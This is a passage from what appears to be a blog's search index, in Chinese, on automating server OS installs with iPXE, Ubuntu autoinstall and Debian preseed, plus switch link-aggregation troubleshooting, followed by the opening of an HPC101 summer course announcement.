\u5df2\u5b9e\u73b0\u4e86\u81ea\u52a8\u5316\u64cd\u4f5c\uff0c\u5305\u62ec\u4fee\u6539 NFS \u670d\u52a1\u7aef\u914d\u7f6e\u3001\u91cd\u542f\u670d\u52a1\u4ee5\u53ca\u5b8c\u6210\u540e\u6e05\u7406\u7b49\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e26\u5916\u7ba1\u7406\u7684\u4f20\u8f93\u901f\u5ea6\u8f83\u6162\uff0c\u901a\u5e38\u4e0d\u8d85\u8fc7 10MB/s\u3002\u6302\u8f7d\u8f83\u5927\u7684\u5b89\u88c5\u4ecb\u8d28\uff08\u5982 Ubuntu ISO\uff09\u65f6\uff0c\u8017\u65f6\u8f83\u957f\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9009\u62e9\u6302\u8f7d\u4e00\u4e2a\u5c0f\u578b\u5f15\u5bfc\u7a0b\u5e8f\u4f5c\u4e3a\u8df3\u677f\uff0c\u7531\u5f15\u5bfc\u7a0b\u5e8f\u5c06\u5b89\u88c5\u4ecb\u8d28\u4e0b\u8f7d\u5230\u5185\u5b58\u4e2d\u5e76\u542f\u52a8\u5b89\u88c5\u7a0b\u5e8f\uff0c\u4ece\u800c\u663e\u8457\u63d0\u5347\u901f\u5ea6\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u5f15\u5bfc\u7a0b\u5e8fipxe","title":"\u5f15\u5bfc\u7a0b\u5e8f\uff1aiPXE","text":"<p>iPXE \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u7f51\u7edc\u5f15\u5bfc\u7a0b\u5e8f\uff0c\u955c\u50cf\u901a\u5e38\u53ea\u6709\u51e0\u5146\u5927\u5c0f\uff0c\u65e0\u8bba\u901a\u8fc7 KVM \u6302\u8f7d\u8fd8\u662f\u8fdc\u7a0b\u955c\u50cf\u6302\u8f7d\uff0c\u901f\u5ea6\u90fd\u975e\u5e38\u5feb\u3002\u5b83\u652f\u6301\u591a\u79cd\u7f51\u7edc\u534f\u8bae\uff08\u5982 HTTP\u3001FTP\u3001TFTP \u7b49\uff09\u4e0b\u8f7d\u5185\u6838\u548c initrd \u6587\u4ef6\uff0c\u5e76\u542f\u52a8\u5b89\u88c5\u7a0b\u5e8f\uff0c\u540c\u65f6\u652f\u6301\u901a\u8fc7\u5d4c\u5165\u811a\u672c\u5b9e\u73b0\u81ea\u52a8\u5316\u914d\u7f6e\u3002</p> <p>netboot.xyz \u662f\u57fa\u4e8e iPXE \u7684\u5de5\u5177\uff0c\u5185\u7f6e\u4e86\u591a\u79cd\u64cd\u4f5c\u7cfb\u7edf\u7684\u5b89\u88c5\u7a0b\u5e8f\u3002\u5982\u679c\u670d\u52a1\u5668\u73af\u5883\u80fd\u591f\u8bbf\u95ee\u516c\u7f51\uff08\u5b89\u88c5\u7a0b\u5e8f\u5b58\u653e\u4e8e netboot.xyz\uff09\uff0c\u63a8\u8350\u4f7f\u7528 netboot.xyz \u8fdb\u884c\u5b89\u88c5\u6216\u81ea\u5b9a\u4e49\uff0c\u751a\u81f3\u53ef\u4ee5\u642d\u5efa\u81ea\u5df1\u7684 PXE \u670d\u52a1\u5668\uff08\u53c2\u8003 Self Hosting | netboot.xyz\uff09\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u5d4c\u5165\u811a\u672cembedded-script","title":"\u5d4c\u5165\u811a\u672c\uff08Embedded Script\uff09","text":"<p>\u4ee5\u4e0b iPXE \u811a\u672c\u793a\u4f8b\u5c55\u793a\u4e86\u5982\u4f55\u81ea\u52a8\u68c0\u6d4b\u53ef\u7528\u7f51\u53e3\u5e76\u914d\u7f6e IP \u5730\u5740\u3002iPXE \u9ed8\u8ba4\u652f\u6301 LACP\uff0c\u56e0\u6b64\u591a\u7f51\u53e3\u670d\u52a1\u5668\u4e5f\u80fd\u6b63\u5e38\u5de5\u4f5c\u3002</p> <pre><code>iflinkwait -t 1000 &amp;&amp; echo Detected link on ${ifname} || goto shell\n# DHCP \u65e0\u9700\u4e0b\u5217\u914d\u7f6e\nset ${ifname}/ip {{ hostvar.ansible_host }}\nset ${ifname}/netmask *.*.*.*\nset ${ifname}/gateway *.*.*.*\nset dns *.*.*.*\n</code></pre> <p>\u5bf9\u4e8e Debian\uff0c\u955c\u50cf\u6e90\u81ea\u5e26 netboot \u652f\u6301\uff0c\u53ef\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u5f15\u5bfc\u8fdb\u5165\u5b89\u88c5\u7a0b\u5e8f\uff1a</p> <pre><code>initrd debian/dists/stable/main/installer-amd64/current/images/netboot/debian-installer/amd64/initrd.gz\nkernel debian/dists/stable/main/installer-amd64/current/images/netboot/debian-installer/amd64/linux\nboot\n</code></pre> <p>Ubuntu \u955c\u50cf\u6e90\u4e5f\u652f\u6301\u7c7b\u4f3c\u64cd\u4f5c\uff0c\u4f46\u4ec5\u6302\u8f7d kernel \u548c initrd \u6587\u4ef6\u4e0d\u591f\uff0c\u5b89\u88c5\u7a0b\u5e8f\u4f1a\u5f3a\u5236\u8981\u6c42\u6302\u8f7d\u5b89\u88c5\u4ecb\u8d28\uff0c\u5426\u5219\u65e0\u6cd5\u542f\u52a8\u5b89\u88c5\u8fc7\u7a0b\u3002\u901a\u8fc7\u4f20\u9012\u5185\u6838\u53c2\u6570 <code>url=</code>\uff0c\u53ef\u4ee5\u8ba9\u5b89\u88c5\u7a0b\u5e8f\u81ea\u52a8\u4e0b\u8f7d\u6240\u9700\u6587\u4ef6\uff1a</p> <pre><code>set base_url http://{{ mirror_site }}/ubuntu-releases/{{ release }}\nset kernel_url ${base_url}/netboot/amd64/linux\nset initrd_url ${base_url}/netboot/amd64/initrd\nset iso_url ${base_url}/ubuntu-{{ release }}-live-server-amd64.iso\n\ninitrd ${initrd_url}\nkernel ${kernel_url} initrd=initrd autoinstall url=${iso_url}\nboot\n</code></pre> <p>iPXE \u5f15\u5bfc\u8fdb\u5165\u5b89\u88c5\u7a0b\u5e8f\u540e\uff0c\u5b89\u88c5\u7a0b\u5e8f\u9700\u8981\u81ea\u5df1\u91cd\u65b0\u914d\u7f6e\u7f51\u7edc\uff0c\u7136\u540e\u624d\u80fd\u4e0b\u8f7d ISO \u955c\u50cf\u3002\u5bf9\u4e8e\u9759\u6001\u5730\u5740\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u5728 iPXE \u4e2d\u4f20\u9012\u5185\u6838\u53c2\u6570 <code>ip</code>\u4ee5\u914d\u7f6e\u7f51\u7edc\uff1a</p> <pre><code>kernel ... ip=&lt;client-ip&gt;:&lt;server-ip&gt;:&lt;gw-ip&gt;:&lt;netmask&gt;:&lt;hostname&gt;:&lt;device&gt;:&lt;autoconf&gt;:&lt;dns0-ip&gt;:&lt;dns1-ip&gt;:&lt;ntp0-ip&gt;\n</code></pre> <p></p> \u5b8c\u6210\u7f51\u7edc\u914d\u7f6e\u540e\u4e0b\u8f7d\u955c\u50cf\u7684 Ubuntu Installer <p>\u5173\u4e8e <code>sanboot</code></p> <p>\u867d\u7136\u6709\u4f7f\u7528 <code>sanboot</code> \u6302\u8f7d ISO \u955c\u50cf\u7684\u4f8b\u5b50\uff0c\u4f46\u5b9e\u6d4b\u53d1\u73b0 Debian \u548c Ubuntu \u5747\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\u3002\u5f15\u5bfc\u540e\u4f1a\u63d0\u793a\u627e\u4e0d\u5230\u5b89\u88c5\u4ecb\u8d28\uff08incorrect installation media detected\uff09\u3002\u76f8\u5173\u8ba8\u8bba\u6307\u51fa\u8be5\u547d\u4ee4\u9002\u7528\u4e8e iSCSI\uff0c\u800c\u4e00\u822c\u4e0d\u9002\u7528\u4e8e HTTP\u3002</p> <pre><code>sanboot --no-describe --drive 0x81 http://.iso\n</code></pre>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u7f16\u8bd1-ipxe","title":"\u7f16\u8bd1 iPXE","text":"<p>\u751f\u6210 iPXE \u955c\u50cf\u9700\u8981\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u4e3a\u4e86\u652f\u6301\u5728 x86-64 \u548c ARM64 \u67b6\u6784\u3001Linux \u548c macOS \u7cfb\u7edf\u4e0a\u8fd0\u884c\uff0c\u5e76\u907f\u514d\u6c61\u67d3\u672c\u5730\u73af\u5883\uff0c\u53ef\u4ee5\u4f7f\u7528 Docker \u5bb9\u5668\u5b8c\u6210\u7f16\u8bd1\u4efb\u52a1\u3002\u5728 ARM64 \u4e0a\u8fd0\u884c\u65f6\uff0c\u5c06\u4f7f\u7528\u4ea4\u53c9\u5de5\u5177\u94fe\u7f16\u8bd1 iPXE\u3002</p> <pre><code>RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\\n    git build-essential isolinux mtools genisoimage ca-certificates \\\n    liblzma-dev gcc-x86-64-linux-gnu\n\nRUN git clone --depth=1 --branch=master https://github.com/ipxe/ipxe.git /ipxe\n# \u9632\u6b62 iPXE \u4f7f\u7528 git \u786e\u5b9a\u7248\u672c\u53f7\nRUN rm -rf /ipxe/.git\nWORKDIR /ipxe/src\nRUN make -j$(nproc) bin-x86_64-efi/ipxe.efi CROSS=x86_64-linux-gnu- EMBED={{ your_script }}\n</code></pre> <p>macOS \u539f\u751f\u7f16\u8bd1\u7684\u9650\u5236</p> <p>\u867d\u7136 macOS \u53ef\u4ee5\u901a\u8fc7 Homebrew \u5b89\u88c5 <code>x86_64-elf-gcc</code> \u8fdb\u884c\u4ea4\u53c9\u7f16\u8bd1\uff0c\u4f46\u4ee5\u4e0b\u4efb\u52a1\u65e0\u6cd5\u5728 macOS \u4e0a\u4ee5\u539f\u751f\u65b9\u5f0f\u5b8c\u6210\uff1a</p> <ul> <li>\u7f16\u8bd1 iPXE \u955c\u50cf\uff1amacOS \u7f3a\u5c11 isolinux \u548c syslinux \u7684\u76f8\u5173\u5de5\u5177\u3002</li> <li>\u6253\u5305 initrd\uff1amacOS \u7684 cpio \u547d\u4ee4\u4e0d\u652f\u6301 <code>-A</code> \u9009\u9879\u3002</li> </ul> <p>\u8fd9\u4e9b\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u4e0b\u8f7d isolinux \u6216\u7f16\u8bd1 cpio \u89e3\u51b3\uff0c\u4f46\u64cd\u4f5c\u8f83\u4e3a\u7e41\u7410\uff0c\u76f8\u6bd4\u4e4b\u4e0b\u4f7f\u7528 Docker \u5bb9\u5668\u66f4\u52a0\u9ad8\u6548\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u53d1\u884c\u7248\u81ea\u52a8\u5b89\u88c5","title":"\u53d1\u884c\u7248\u81ea\u52a8\u5b89\u88c5","text":"<p>\u4e0d\u540c\u53d1\u884c\u7248\u7684\u5b89\u88c5\u7a0b\u5e8f\u5404\u6709\u7279\u70b9\uff0c\u81ea\u52a8\u5316\u914d\u7f6e\u65b9\u5f0f\u4e5f\u6709\u6240\u4e0d\u540c\u3002\u76f8\u6bd4 Debian \u7684 preseed\uff0cUbuntu \u7684 autoinstall \u5177\u6709\u4ee5\u4e0b\u4f18\u52bf\uff1a</p> <ul> <li>\u4f7f\u7528\u6e05\u6670\u7684 YAML \u683c\u5f0f\u914d\u7f6e\u6587\u4ef6\uff0c\u53d6\u4ee3\u4e86 Debian \u7684\u547d\u4ee4\u98ce\u683c preseed \u6587\u4ef6\uff0c\u652f\u6301\u66f4\u590d\u6742\u7684\u914d\u7f6e\uff08\u5982 ZFS \u6839\u76ee\u5f55\u548c netplan \u98ce\u683c\u7684\u7f51\u7edc\u914d\u7f6e\uff0c\u652f\u6301 LACP \u805a\u5408\uff09\u3002</li> <li>\u6d41\u7a0b\u66f4\u52a0\u81ea\u52a8\u5316\uff0c\u672a\u6307\u5b9a\u7684\u914d\u7f6e\u9879\u4f1a\u4f7f\u7528\u9ed8\u8ba4\u503c\uff1b\u800c Debian \u7684 preseed \u672a\u6307\u5b9a\u5219\u4f1a\u505c\u6b62\uff0c\u4e14\u914d\u7f6e\u9879\u7e41\u591a\uff0c\u53ef\u80fd\u6d89\u53ca\u8f6f\u4ef6\u5305\u7684\u9009\u9879\u3002</li> <li>iPXE \u53ef\u901a\u8fc7\u5185\u6838\u53c2\u6570\u76f4\u63a5\u5f15\u5bfc\u5e76\u83b7\u53d6\u914d\u7f6e\u6587\u4ef6\uff1b\u800c Debian \u7684 <code>preseed/url</code> \u53c2\u6570\u5728\u6d4b\u8bd5\u4e2d\u672a\u6210\u529f\u3002</li> </ul>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#ubuntu-autoinstall","title":"Ubuntu autoinstall","text":"<p>Quote</p> <ul> <li>Autoinstall configuration reference manual - Ubuntu installation documentation</li> <li>iPXE script for deploying Ubuntu 20.04 autoinstall nocloud-net method</li> </ul> <p>Ubuntu \u4f7f\u7528\u4ee5\u4e0b\u5185\u6838\u53c2\u6570\u83b7\u53d6\u914d\u7f6e\u6587\u4ef6\u3002\u5b89\u88c5\u7a0b\u5e8f\u4f1a\u5c06 <code>meta-data</code> \u548c <code>user-data</code> \u8def\u5f84\u9644\u52a0\u5230\u53c2\u6570 <code>s</code> \u540e\uff0c\u56e0\u6b64\u8def\u5f84\u672b\u5c3e\u7684 <code>/</code> \u5fc5\u987b\u4fdd\u7559\u3002</p> <pre><code>ds=nocloud-net;s={{ seed_server }}/{{ item }}/\n</code></pre> <p>Autoinstall \u914d\u7f6e\u6587\u4ef6\u7684\u5b98\u65b9\u6587\u6863\u975e\u5e38\u8be6\u7ec6\uff0c\u6309\u9700\u914d\u7f6e\u5373\u53ef\u3002APT \u90e8\u5206\u5bb9\u6613\u914d\u7f6e\u5931\u8d25\uff0c\u4ee5\u4e0b\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u7684 APT \u914d\u7f6e\u793a\u4f8b\uff1a</p> <pre><code>apt:\n  fallback: offline-install\n  geoip: false\n  primary:\n  - arches: [amd64, i386, default]\n    uri: http://{{ mirror_site }}/ubuntu/\n  preserve_sources_list: false\n  security:\n  - arches: [amd64, i386, default]\n    uri: http://{{ mirror_site }}/ubuntu/\n</code></pre>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#debian-preseed","title":"Debian preseed","text":"<p>\u6839\u636e\u5b98\u65b9\u6587\u6863\uff0c<code>preseed/url=</code> \u5185\u6838\u53c2\u6570\u53ef\u7528\u4e8e\u4f20\u9012\u914d\u7f6e\u6587\u4ef6\uff0c\u4f46\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u56e0\u6b64\u5c06\u914d\u7f6e\u6587\u4ef6\u5d4c\u5165 initrd \u4e2d\u3002debian-installer \u4f1a\u81ea\u52a8\u68c0\u6d4b initrd \u6839\u76ee\u5f55\u4e0b\u7684 <code>preseed.cfg</code> \u6587\u4ef6\uff0c\u5e76\u542f\u52a8\u81ea\u52a8\u5b89\u88c5\u3002</p> <p>\u90e8\u7f72\u65b9\u5f0f\uff1a</p> <ul> <li>\u4f7f\u7528 ISO\uff1a\u901a\u8fc7\u5e26\u5916\u7ba1\u7406\u6302\u8f7d ISO \u6587\u4ef6\u5e76\u542f\u52a8\u3002</li> <li>\u4f7f\u7528 initrd\uff1a\u901a\u8fc7 iPXE \u5f15\u5bfc\uff0c\u4e0b\u8f7d initrd \u6587\u4ef6\u5e76\u542f\u52a8\u3002</li> </ul> <p>\u4e0d\u8db3\u4e4b\u5904\uff1a\u6587\u4ef6\u4f53\u79ef\u8f83\u5927\uff0c\u53ef\u80fd\u9700\u8981\u4e3a\u6bcf\u53f0\u670d\u52a1\u5668\u5355\u72ec\u6253\u5305\u3002</p> <p>\u4ee5\u4e0b\u662f\u6253\u5305 ISO \u6216 initrd \u7684\u6d41\u7a0b\uff1a</p> <ol> <li> <p>\u89e3\u538b ISO \u6587\u4ef6\uff08\u63a8\u8350\u4f7f\u7528 <code>netinst</code> \u7248\u672c\uff09\u3002</p> <pre><code>xorriso -osirrox on -indev $ISO_NAME -extract / /iso\n</code></pre> </li> <li> <p>\uff08\u6253\u5305 ISO \u65f6\uff09\u4fee\u6539 Bootloader \u8bbe\u7f6e\uff0c\u4f7f\u5176\u81ea\u52a8\u542f\u52a8\u5b89\u88c5\u7a0b\u5e8f\u3002</p> <pre><code># BIOS\nsed -i 's/timeout 1/timeout 0/' /iso/isolinux/prompt.cfg\n# UEFI\necho 'set timeout=0' &gt;&gt; /iso/boot/grub/grub.cfg\necho 'set default=1' &gt;&gt; /iso/boot/grub/grub.cfg\n</code></pre> </li> <li> <p>\u5c06 <code>preseed.cfg</code> \u6587\u4ef6\u5d4c\u5165 initrd\u3002\u8be5 initrd \u53ef\u76f4\u63a5\u4f5c\u4e3a iPXE \u7684 <code>initrd</code> \u53c2\u6570\u3002</p> <pre><code>gunzip \"$ISO_DIR/install.amd/initrd.gz\"\ncp \"$PRESEED_FILE\" \"$ISO_DIR/install.amd/preseed.cfg\"\ncd \"$ISO_DIR/install.amd\" &amp;&amp; echo \"preseed.cfg\" | cpio -H newc -o -A -F \"$ISO_DIR/install.amd/initrd\"\nrm \"$ISO_DIR/install.amd/preseed.cfg\"\ngzip \"$ISO_DIR/install.amd/initrd\"\n</code></pre> </li> <li> <p>\uff08\u6253\u5305 ISO \u65f6\uff09\u91cd\u65b0\u751f\u6210 ISO \u6587\u4ef6\u3002</p> <pre><code>chmod +w \"$ISO_DIR/md5sum.txt\"\ncd \"$ISO_DIR\" &amp;&amp; find . -follow -type f ! -name md5sum.txt -print0 | xargs -0 md5sum &gt;md5sum.txt\nchmod -w \"$ISO_DIR/md5sum.txt\"\n\nxorriso -as mkisofs \\\n    -r \\\n    -o \"$OUTPUT_ISO\" \\\n    -J -joliet-long -cache-inodes \\\n    -isohybrid-mbr /usr/lib/ISOLINUX/isohdpfx.bin \\\n    -b isolinux/isolinux.bin \\\n    -c isolinux/boot.cat \\\n    -boot-load-size 4 -boot-info-table -no-emul-boot \\\n    -eltorito-alt-boot \\\n    -e boot/grub/efi.img \\\n    -no-emul-boot -isohybrid-gpt-basdat -isohybrid-apm-hfsplus \\\n    -quiet \\\n    \"$ISO_DIR\"\n</code></pre> </li> </ol>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u4ea4\u6362\u673a\u4e0e\u670d\u52a1\u5668\u94fe\u8def\u805a\u5408","title":"\u4ea4\u6362\u673a\u4e0e\u670d\u52a1\u5668\u94fe\u8def\u805a\u5408","text":"<p>\u53c2\u8003 H3C\u4ea4\u6362\u673a\u4e0e\u670d\u52a1\u5668\u5bf9\u63a5\u64cd\u4f5c\u6307\u5bfc-6W100-\u65b0\u534e\u4e09\u96c6\u56e2-H3C\u3002\u5bf9\u4e8e\u4ea4\u6362\u673a\uff0c\u9700\u8981\u6ce8\u610f\u5982\u4e0b\u914d\u7f6e\uff1a</p> <ul> <li>\u914d\u7f6e\u4e8c\u5c42\u805a\u5408\u63a5\u53e3\u4e3a\u52a8\u6001\u6a21\u5f0f\uff08LACP\uff09\u3002</li> <li>\u914d\u7f6e\u805a\u5408\u7aef\u53e3\u4e3a\u8fb9\u7f18\u7aef\u53e3\uff0c\u8df3\u8fc7 30s \u7684 STP \u7b49\u5f85\u65f6\u95f4\u3002</li> </ul> <p>\u5982\u679c\u4e0d\u6309\u7167\u4e0a\u8ff0\u914d\u7f6e\uff0c\u4f1a\u4ea7\u751f\u5982\u4e0b\u95ee\u9898\uff1a</p> <ul> <li>\u9759\u6001\u805a\u5408\u6a21\u5f0f\u4e0b\uff0ciPXE \u548c\u5b89\u88c5\u7a0b\u5e8f\u53ef\u80fd\u65e0\u6cd5\u8054\u7f51\u3002</li> <li>\u672a\u914d\u7f6e\u8fb9\u7f18\u7aef\u53e3\u65f6\uff0c\u63a5\u53e3\u9700\u7b49\u5f85 30s \u624d\u4f1a\u8fdb\u5165 Link Up \u72b6\u6001\uff0c\u5bfc\u81f4 <code>bonding</code> \u5185\u6838\u6a21\u5757\u94fe\u8def\u72b6\u6001\u68c0\u6d4b\u5931\u8d25\u3002</li> </ul>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u5176\u4ed6\u95ee\u9898","title":"\u5176\u4ed6\u95ee\u9898","text":"<ol> <li> <p>R4900 \u7f51\u7edc\u63a5\u53e3\u5f02\u5e38</p> <p>\u5728\u7cfb\u7edf\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u6709\u901a\u8fc7 <code>ens2f1np1</code> \u7aef\u53e3\u624d\u80fd\u6b63\u5e38\u8054\u7f51\uff1b\u800c\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u5fc5\u987b\u5207\u6362\u5230 <code>ens2f0np0</code> \u7aef\u53e3\u624d\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u5373\u4f7f\u4e24\u4e2a\u7f51\u53e3\u5747\u5df2\u8fde\u63a5\u3002\u521d\u6b65\u6000\u7591\u662f Broadcom \u9a71\u52a8 <code>bnxt_en</code> \u7684\u95ee\u9898\uff0c\u9700\u8fdb\u4e00\u6b65\u6392\u67e5\u3002\u6b64\u95ee\u9898\u672a\u5728 X10000 \u4e0a\u590d\u73b0\u3002</p> <p>iPXE \u542f\u52a8\u65f6\uff0cinitrd \u5076\u5c14\u4f1a\u4e0b\u8f7d\u5230\u4e00\u534a\u5361\u4f4f\uff0c\u56e0\u6b64\u811a\u672c\u4e2d\u6dfb\u52a0\u4e86\u5931\u8d25\u91cd\u8bd5\u7684\u903b\u8f91\u3002X10000 \u672a\u51fa\u73b0\u8be5\u95ee\u9898\uff0c\u4f46 R4900 \u4e0a\u7ecf\u5e38\u51fa\u73b0\u3002</p> </li> <li> <p>\u94fe\u8def\u805a\u5408\u95ee\u9898</p> <p>\u4f7f\u7528 <code>bonding</code> \u5185\u6838\u6a21\u5757\u65f6\uff0c\u8c03\u7528 <code>bond_3ad_get_active_agg_info</code> \u5931\u8d25\uff0c\u5bfc\u81f4\u63a5\u53e3\u65e0\u6cd5 UP\u3002\u4ee5\u4e0b\u73af\u5883\u5747\u51fa\u73b0\u8be5\u95ee\u9898\uff1a</p> <ul> <li>\u7f51\u5361\u9a71\u52a8\uff1a<code>ixgbe</code> \u548c <code>bnxt_en</code></li> <li>\u5185\u6838\u7248\u672c\uff1a<code>6.1</code>\uff08stable\uff09\u548c <code>6.12.22</code>\uff08unstable\uff09</li> </ul> <p>\u6b64\u95ee\u9898\u5728 Debian \u7cfb\u7edf\u4e2d\u590d\u73b0\uff0c\u4f46\u5728 Ubuntu \u7cfb\u7edf\u4e2d\u672a\u51fa\u73b0\u3002</p> </li> <li> <p>H3C \u4ea4\u6362\u673a\u94fe\u8def\u805a\u5408\u6a21\u5f0f\u6d4b\u8bd5</p> <p>H3C \u4ea4\u6362\u673a\u652f\u6301\u9759\u6001\u548c\u52a8\u6001\u4e24\u79cd\u4e8c\u5c42\u94fe\u8def\u805a\u5408\u6a21\u5f0f\u3002\u4ee5\u4e0b\u672a\u8bbe\u7f6e STP \u8fb9\u7f18\u7aef\u53e3\u65f6\u7684\u6d4b\u8bd5\u7ed3\u679c\uff1a</p> \u670d\u52a1\u5668 \u805a\u5408\u6a21\u5f0f \u6d4b\u8bd5\u7ed3\u679c X10000 \u56db\u53e3\u9759\u6001\u805a\u5408 iPXE \u6240\u6709\u7f51\u53e3\u65e0\u6cd5\u8054\u7f51 X10000 \u56db\u53e3\u52a8\u6001\u805a\u5408 iPXE \u4efb\u4e00\u7f51\u53e3\u53ef\u6b63\u5e38\u8054\u7f51 X10000 \u65e0\u805a\u5408 iPXE \u6240\u6709\u7f51\u53e3\u65e0\u6cd5\u8054\u7f51 R4900 \u65e0\u805a\u5408 iPXE \u4efb\u4e00\u7f51\u53e3\u53ef\u6b63\u5e38\u8054\u7f51 R4900 \u53cc\u53e3\u52a8\u6001\u805a\u5408 iPXE \u5176\u4e2d\u4e00\u4e2a\u7f51\u53e3\u53ef\u6b63\u5e38\u8054\u7f51 </li> </ol>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/","title":"\ud83c\udf93 Hello, HPC World | 2025 \u8d85\u7b97\u77ed\u5b66\u671f\u8bfe\u7a0b\u6b63\u5f0f\u542f\u52a8\uff01","text":""},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u8d85\u7b97\u77ed\u5b66\u671f\u8bfe\u7a0bhpc101","title":"\ud83d\ude80 \u8d85\u7b97\u77ed\u5b66\u671f\u8bfe\u7a0b\uff1aHPC101","text":""},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#-\u57fa\u672c\u4fe1\u606f","title":"\ud83d\udccc \u57fa\u672c\u4fe1\u606f","text":"<ul> <li>\ud83c\udfaf \u9762\u5411\u5bf9\u8c61\uff1a \u4e0d\u9650\u5e74\u7ea7\u3001\u4e0d\u9650\u4e13\u4e1a\uff0c\u4e3b\u8981\u9762\u5411 2024 \u7ea7\u672c\u79d1\u751f</li> <li>\ud83d\udccd \u4e0a\u8bfe\u5730\u70b9\uff1a \u7d2b\u91d1\u6e2f\u6821\u533a\uff0c\u6559\u5ba4\u5f85\u5b9a</li> <li>\ud83d\udcc5 \u8bfe\u7a0b\u65f6\u95f4\uff1a 6 \u6708 25 \u65e5 - 7 \u6708 7 \u65e5\uff0c\u6bcf\u5929 8:30 - 11:30 &amp; 14:00 - 17:00</li> <li>\ud83e\udde0 \u8bfe\u7a0b\u5f3a\u5ea6\uff1a \u5927\u3001\u5b9e\u3001\u96be\u3001\u6709\u8da3\uff01\uff08\u8fde\u7855\u535a\u751f\u90fd\u6765\u9009\uff01\uff09</li> </ul> <p>\ud83d\udce9 \u62a5\u540d\u65b9\u5f0f\u3001QQ\u7fa4\u3001\u90ae\u4ef6\u5730\u5740 \u8bf7\u89c1\u6587\u672b\u8bf4\u660e</p>"},{"location":"blog/2025/05/19/-hello-hpc-world--2025-%E8%B6%85%E7%AE%97%E7%9F%AD%E5%AD%A6%E6%9C%9F%E8%AF%BE%E7%A8%8B%E6%AD%A3%E5%BC%8F%E5%90%AF%E5%8A%A8/#\u4ec0\u4e48\u662f-hpc","title":"\u4ec0\u4e48\u662f HPC\uff1f","text":"<p>HPC\uff0c\u5168\u79f0 High Performance Computing\uff0c\u4e2d\u6587\u540d\u53eb\u201c\u9ad8\u6027\u80fd\u8ba1\u7b97\u201d\uff0c\u662f\u4e00\u79cd\u4ee5\u6781\u9ad8\u901f\u5ea6\u6267\u884c\u590d\u6742\u8ba1\u7b97\u4efb\u52a1\u7684\u6280\u672f\u3002HPC \u7cfb\u7edf\u53ef\u4ee5\u5728 \u6781\u77ed\u65f6\u95f4\u5185\u5904\u7406\u6d77\u91cf\u6570\u636e\u3001\u6267\u884c\u590d\u6742\u6a21\u62df\u3001\u652f\u6491\u6df1\u5ea6\u5b66\u4e60\u548c\u79d1\u5b66\u7814\u7a76\u3002</p> 